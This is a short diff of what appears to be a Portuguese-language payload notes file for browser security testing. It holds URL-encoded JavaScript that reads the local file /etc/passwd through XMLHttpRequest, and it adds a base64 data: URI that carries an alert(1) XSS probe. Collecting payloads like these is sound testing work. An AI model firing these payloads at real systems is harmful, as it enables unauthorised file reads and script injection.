@@ -49,7 +49,7 @@ var%20oReq%20%3D%20new%20XMLHttpRequest()%3B%0A
 oReq.addEventListener(%22load%22%2C%20reqListener)%3B%0A
 oReq.open(%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0A
 oReq.send()%3B
-
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
 
 ------------------------------------------------------------------------------------------------------
 Para testar payloads que contenham javascript, escreva no navegador:
